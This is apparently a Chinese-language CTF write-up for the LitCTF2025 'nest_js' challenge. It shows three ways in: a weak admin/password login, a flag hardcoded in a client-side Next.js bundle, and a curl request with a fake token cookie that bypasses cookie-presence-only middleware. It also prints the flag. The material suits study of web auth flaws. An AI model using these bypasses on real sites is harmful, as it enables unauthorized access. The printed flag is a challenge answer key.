---
type: source
created: 2026-05-11
updated: 2026-05-11
related: []
---

# LitCTF2025 nest_js (NSSCTF)

Next.js 前端 + 弱口令登录。Flag 硬编码在客户端 JS bundle 中，dashboard middleware 只检查 token cookie 是否存在（非空），不验证签名。

涉及概念：[[concepts/nextjs-client-bundle-leak]]
涉及实体：[[entities/ctf_nssctf]]

## 挑战

Next.js App Router 前端，`/login` 页面 POST 到 `/api/login`。成功后设置 cookie 跳转 `/dashboard`。

## 解法

### 方法一：弱口令

`admin` / `password` 直接登录成功，返回 `{"token":"generated-jwt-token-here"}`。

### 方法二：JS bundle 信息泄露

Flag 硬编码在客户端组件 JS 中：
```
/_next/static/chunks/app/dashboard/page-37199430e4ac8e2c.js
```
明文包含：`"flag: ","LitCTF{...}"`

### 方法三：认证绕过

Middleware 只检查 token cookie 是否存在，不验证内容：
```bash
curl '/dashboard' -H "Cookie: token=anything"  # 拿到 flag
```

## Flag

```
LitCTF{b11dd2bc-935b-47d7-ada1-dd12a3140c4a}
```

## 踩坑

- 题目名 `nest_js` 暗示 NestJS 后端，实际前端是 Next.js
- 不需要任何高级技巧，弱口令或直接读 JS bundle 即可
